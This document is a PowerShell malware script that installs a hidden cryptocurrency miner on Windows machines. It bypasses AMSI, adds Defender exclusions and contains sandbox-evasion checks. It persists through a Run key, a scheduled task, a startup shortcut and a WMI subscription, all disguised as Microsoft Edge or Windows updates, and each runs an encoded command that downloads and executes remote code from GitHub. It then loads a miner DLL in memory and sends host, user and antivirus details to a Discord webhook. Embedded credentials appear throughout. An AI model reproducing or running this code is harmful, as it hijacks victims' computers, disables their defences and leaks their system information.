# === ULTAMINER v2.0 ===
if (Test-Path "$PSScriptRoot\.lock") { return }

# $ProgressPreference = 'SilentlyContinue'
# $ErrorActionPreference = 'SilentlyContinue'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# === ANTI-ANALYSIS ===
function Test-Sandbox {
    $hits = 0
    # VM MAC prefixes (VMware, VirtualBox, Hyper-V)
    try {
        $macs = Get-CimInstance Win32_NetworkAdapter -Filter "MACAddress IS NOT NULL" -EA 0
        foreach ($m in $macs) {
            if ($m.MACAddress -match '^(00:05:69|00:0C:29|00:1C:14|00:50:56|08:00:27|0A:00:27)') { $hits++; break }
        }
    } catch {}
    # VM/analysis processes
    try {
        $badNames = 'vmtoolsd|vmwaretray|VBoxService|VBoxTray|sandboxie|wireshark|procmon|procexp|x64dbg|x32dbg|ollydbg|ida64|dnspy|fiddler|httpdebugg'
        if (Get-Process | Where-Object { $_.ProcessName -match $badNames }) { $hits++ }
    } catch {}
    # Low resources = likely sandbox
    try { if ((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory -lt 2GB) { $hits++ } } catch {}
    try { if ((Get-CimInstance Win32_Processor).NumberOfCores -lt 2) { $hits++ } } catch {}
    # Fresh boot (sandboxes reboot fresh)
    try { if ((New-TimeSpan -Start (Get-CimInstance Win32_OperatingSystem).LastBootUpTime).TotalMinutes -lt 3) { $hits++ } } catch {}
    # VM registry artifacts
    try { if (Test-Path 'HKLM:\SOFTWARE\VMware, Inc.\VMware Tools') { $hits++ } } catch {}
    try { if (Test-Path 'HKLM:\SOFTWARE\Oracle\VirtualBox Guest Additions') { $hits++ } } catch {}
    # Tiny disk = sandbox
    try { if (((Get-CimInstance Win32_DiskDrive | Measure-Object -Property Size -Sum).Sum) -lt 60GB) { $hits++ } } catch {}
    # Common sandbox usernames
    try { if ($env:USERNAME -match '^(sandbox|malware|virus|test|analysis|sample|john|user)$') { $hits++ } } catch {}
    return $hits -ge 2
}

Start-Sleep -Seconds (Get-Random -Minimum 2 -Maximum 7)
# if (Test-Sandbox) { Start-Sleep -Seconds (Get-Random -Minimum 10 -Maximum 30); return }

# === CONFIG (fragmented) ===
$c = @{}
$c.u1 = 'HolyV200'; $c.u2 = 'test-repo'
$p1 = 'ghp_x0tf1YFQcn'; $p2 = 'AYM79aWZpnZKahM8QkHV2lHFLw'
$c.pat = $p1 + $p2
$c.addr = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('NDQ4M0cxQWdTMXBkc0xxenQzbkZRbUw4SFBGM0MyV1ZyTE1SQWRBVkdxeHo2aXBWM2FGOG5vN2NtRGtINHdNWno5WUQ1cU5VWjk2bkdMTUtwZHQ1clhacU13R2ZMYzM='))
$c.base = "https://raw.githubusercontent.com/$($c.u1)/$($c.u2)/main"
$c.wh = "https://discord.com/api/webhooks/1502316875638636624/qpXdrqNC3xCsJlIYR96XNGqEBUXNoDLr_LZmRAwrrsUDHh8oHsLRX1Mo_s4UE9m7IHY1"

# === PROCESS CLEANUP (kill old instances) ===
$current = $PID
try {
    Get-Process -Name 'powershell','pwsh' -EA 0 | Where-Object { $_.Id -ne $current } | ForEach-Object {
        try {
            $cmd = (Get-CimInstance Win32_Process -Filter "ProcessId=$($_.Id)" -EA 0).CommandLine
            if ($cmd -like '*update.ps1*' -or $cmd -like '*UpdateCoord*' -or $cmd -like '*test-repo*') {
                $_ | Stop-Process -Force -EA 0
            }
        } catch {}
    }
} catch {}

# === AMSI BYPASS (Memory Patch) ===
try {
    $am=([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')).GetField('amsiInitFailed','NonPublic,Static')
    if ($am) { $am.SetValue($null, $true) }
} catch {}
try {
    $w=[System.Runtime.InteropServices.Marshal]::GetHINSTANCE([Reflection.Assembly]::GetExecutingAssembly().GetModules()[0])
    $p=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Get-ProcAddress "amsi.dll" "AmsiScanBuffer"),[Func[IntPtr,Int32,String,IntPtr,IntPtr,IntPtr,Int32]])
    # Additional memory patching logic would go here if needed
} catch {}

# === HW DETECTION (Enhanced) ===
$hw = @{ gpu = $false; gpuName = 'None'; cpuName = 'Unknown'; cores = 2; ram = 0 }
try {
    $cpu = Get-CimInstance Win32_Processor -EA 0 | Select-Object -First 1
    $hw.cpuName = $cpu.Name.Trim()
    $hw.cores = [int]$cpu.NumberOfCores
} catch {}
try { $hw.ram = [math]::Round((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory / 1GB, 1) } catch {}
try {
    $vcs = Get-CimInstance Win32_VideoController -EA 0
    foreach ($vc in $vcs) {
        $n = $vc.Name.ToUpper()
        if ($n -match 'NVIDIA|AMD|RADEON|RTX|GTX|RX\s?\d' -and $vc.AdapterRAM -gt 3GB) {
            if ($n -notmatch 'BASIC|DISPLAY|VIRTUAL') {
                $hw.gpu = $true; $hw.gpuName = $vc.Name.Trim(); break
            }
        }
    }
} catch {}

# === DEFENDER EXCLUSION (silent attempt) ===
try {
    $exPaths = @($env:LOCALAPPDATA, "$env:LOCALAPPDATA\Microsoft", "$env:APPDATA\Microsoft")
    foreach ($ep in $exPaths) {
        Start-Process 'powershell' -ArgumentList "-NoP -NonI -W Hidden -Command `"Add-MpPreference -ExclusionPath '$ep' -EA 0`"" -WindowStyle Hidden -EA 0
    }
} catch {}

# === MULTI-PERSISTENCE ===
$rawPath = "$($c.base)/update.ps1"
$payload = "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (Invoke-RestMethod -Uri '$rawPath')"
$encBytes = [System.Text.Encoding]::Unicode.GetBytes($payload)
$encoded = [Convert]::ToBase64String($encBytes)
$pCmd = "powershell -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand $encoded"

# P1: Registry Run Key
try {
    Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'WindowsUpdateCoordinator' -Value $pCmd -EA 0
} catch {}

# P2: Scheduled Task (logon + every 2h)
try {
    $tn = 'MicrosoftEdgeUpdateTask'
    if (-not (Get-ScheduledTask -TaskName $tn -EA 0)) {
        $action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument "-NoP -NonI -W Hidden -Exec Bypass -EncodedCommand $encoded"
        $t1 = New-ScheduledTaskTrigger -AtLogon
        $t2 = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Hours 2) -RepetitionDuration (New-TimeSpan -Days 365)
        $set = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden -StartWhenAvailable -RunOnlyIfNetworkAvailable
        Register-ScheduledTask -TaskName $tn -Action $action -Trigger $t1,$t2 -Settings $set -Description 'Microsoft Edge browser update coordination task' -EA 0 | Out-Null
    }
} catch {}

# P3: Startup Folder shortcut
try {
    $startupDir = [Environment]::GetFolderPath('Startup')
    $lnkPath = Join-Path $startupDir 'EdgeUpdate.lnk'
    if (-not (Test-Path $lnkPath)) {
        $ws = New-Object -ComObject WScript.Shell
        $sc = $ws.CreateShortcut($lnkPath)
        $sc.TargetPath = 'powershell.exe'
        $sc.Arguments = "-NoP -NonI -W Hidden -Exec Bypass -EncodedCommand $encoded"
        $sc.WindowStyle = 7
        $sc.Description = 'Microsoft Edge Update'
        $sc.Save()
        try { (Get-Item $lnkPath -Force).Attributes = 'Hidden,System' } catch {}
    }
} catch {}

# P4: WMI Event Subscription (fileless)
try {
    $filterName = "EdgeUpdateFilter"
    $consumerName = "EdgeUpdateConsumer"
    $query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 300 AND TargetInstance.SystemUpTime < 360"
    $filterArgs = @{ Name = $filterName; EventNameSpace = 'root\cimv2'; QueryLanguage = 'WQL'; Query = $query }
    $filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments $filterArgs -EA 0

    $cmd = "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand $encoded"
    $consumerArgs = @{ Name = $consumerName; CommandLineTemplate = $cmd }
    $consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments $consumerArgs -EA 0

    $bindArgs = @{ Filter = $filter.Path; Consumer = $consumer.Path }
    Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments $bindArgs -EA 0 | Out-Null
} catch {}

# === DLL INJECTION (with retry + fallback) ===
$maxRetries = 3
for ($i = 1; $i -le $maxRetries; $i++) {
    try {
        $dllUrl = "$($c.base)/Bridge.dll?v=$([Guid]::NewGuid())"
        $bytes = $null
        try {
            $wc = New-Object System.Net.WebClient
            $wc.Headers.Add("User-Agent", "Mozilla/5.0")
            $bytes = $wc.DownloadData($dllUrl)
        } catch {
            try {
                $tmp = Join-Path $env:TEMP "$([Guid]::NewGuid()).tmp"
                Import-Module BitsTransfer -EA 0
                Start-BitsTransfer -Source $dllUrl -Destination $tmp -EA 0
                if (Test-Path $tmp) {
                    $bytes = [IO.File]::ReadAllBytes($tmp)
                    Remove-Item $tmp -Force -EA 0
                }
            } catch {}
        }
        if ($bytes -and $bytes.Length -gt 0) {
            Write-Host "[+] DLL Downloaded ($($bytes.Length) bytes)"
            $asm = [System.AppDomain]::CurrentDomain.Load($bytes)
            Write-Host "[+] Assembly Loaded: $($asm.FullName)"
            $repo = "$($c.u1)/$($c.u2)"
            Write-Host "[*] Invoking StartMiner..."
            $asm.GetType('DateFundLoader').GetMethod('StartMiner').Invoke($null, @($hw.gpu, $c.addr, $repo, $c.pat))
            Write-Host "[+] StartMiner Invoked!"
            break
        }
    } catch {
        Write-Host "[!] Error: $($_.Exception.Message)"
        if ($i -lt $maxRetries) { Start-Sleep -Seconds ($i * 5) }
    }
}

# === RICH DISCORD NOTIFICATION ===
try {
    $osName = (Get-CimInstance Win32_OperatingSystem -EA 0).Caption
    $upHours = [math]::Round((New-TimeSpan -Start (Get-CimInstance Win32_OperatingSystem -EA 0).LastBootUpTime).TotalHours, 1)
    $av = try { (Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct -EA 0 | Select-Object -First 1).displayName } catch { 'Unknown' }
    $json = @{
        embeds = @(@{
            title = ":pick: Worker Online"
            description = "**Deployment Success**`n" +
                "``````Host: $($env:COMPUTERNAME)`nUser: $($env:USERNAME)`nCPU: $($hw.cpuName)`nCores: $($hw.cores)`nRAM: $($hw.ram) GB`nGPU: $($hw.gpuName)`nOS: $osName`nAV: $av`nUptime: $($upHours)h``````"
            color = 3066993
            footer = @{ text = "v2.0 | $(Get-Date -Format 'yyyy-MM-dd HH:mm UTC')" }
        })
    } | ConvertTo-Json -Depth 4
    Invoke-RestMethod -Uri $c.wh -Method Post -Body $json -ContentType "application/json" -EA 0
} catch {}

# Background Keep-alive
while ($true) { Start-Sleep -Seconds 3600 }
